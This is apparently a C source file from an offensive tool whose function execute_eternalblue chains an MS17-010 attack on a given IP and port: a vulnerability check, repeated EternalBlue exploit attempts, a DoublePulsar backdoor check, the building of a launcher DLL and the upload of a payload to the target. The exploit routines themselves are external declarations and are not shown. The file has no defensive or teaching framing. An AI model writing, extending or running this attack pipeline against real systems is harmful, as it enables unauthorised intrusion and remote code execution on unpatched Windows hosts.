#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <ctype.h>
#include <dirent.h>
#include <poll.h>
#include <pthread.h>
#include <math.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pwd.h>
#include <grp.h>
#include <utime.h>
#include <syslog.h>
#include <wchar.h>
#include "config.h"

#include <stdio.h>

extern int ms17_vuln_status(const char *ip, int port);
extern int EternalBlue(const char *ip, int port);
extern int doublepulsar_check(const char *ip, int port);
extern int build_launcher_dll(const char *target_binary, const char *output_path);
extern int upload_payload(const char *ip, int port, const char *payload_path, int flag);

int execute_eternalblue(const char *ip, int port, const char *payload_path)
{
    int attempt;
    int exploit_succeeded = 0;

    (void)payload_path;

    printf("[execute_eternalblue] Checking MS17-010 vulnerability...\n");
    if (!ms17_vuln_status(ip, port)) {
        printf("[execute_eternalblue] Target is not vulnerable.\n");
        return -1;
    }

    for (attempt = 0; attempt < MAX_RETRIES; ++attempt) {
        printf("[execute_eternalblue] EternalBlue attempt %d of %d...\n",
               attempt + 1, MAX_RETRIES);
        if (EternalBlue(ip, port)) {
            exploit_succeeded = 1;
            break;
        }
    }
    if (!exploit_succeeded) {
        printf("[execute_eternalblue] EternalBlue failed after all retries.\n");
        return -2;
    }

    printf("[execute_eternalblue] Checking DoublePulsar status...\n");
    if (!doublepulsar_check(ip, port)) {
        printf("[execute_eternalblue] DoublePulsar is not active.\n");
        return -3;
    }

    printf("[execute_eternalblue] Building launcher DLL...\n");
    if (build_launcher_dll(TARGET_BINARY, PAYLOAD_DLL_PATH) != 0) {
        printf("[execute_eternalblue] Failed to build launcher DLL.\n");
        return -4;
    }

    printf("[execute_eternalblue] Uploading payload...\n");
    if (upload_payload(ip, port, PAYLOAD_DLL_PATH, 1) != 0) {
        printf("[execute_eternalblue] Failed to upload payload.\n");
        return -5;
    }

    printf("[execute_eternalblue] Pipeline completed successfully.\n");
    return 0;
}